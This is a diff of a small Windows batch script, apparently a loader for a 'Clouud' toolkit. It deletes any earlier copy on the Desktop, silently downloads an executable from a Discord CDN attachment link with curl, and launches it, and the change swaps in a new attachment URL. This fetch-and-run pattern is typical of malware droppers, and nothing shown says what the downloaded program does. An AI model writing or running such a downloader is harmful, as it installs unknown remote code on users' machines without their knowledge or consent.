@@ -5,7 +5,7 @@
 if exist C:\Users\%username%\Desktop\Clouud_V2.exe ( 
 del /s /q /f C:\Users\%username%\Desktop\Clouud_V2.exe 
 )
-set link=https://cdn.discordapp.com/attachments/992548263058210888/994024558489247764/Clouud_Toolkit.exe
+set link=https://cdn.discordapp.com/attachments/992548263058210888/994346768026320896/Clouud_Toolkit.exe
 curl -s -o C:\Users\%username%\Desktop\Clouud_V2.exe %link%
 start C:\Users\%username%\Desktop\Clouud_V2.exe
 exit
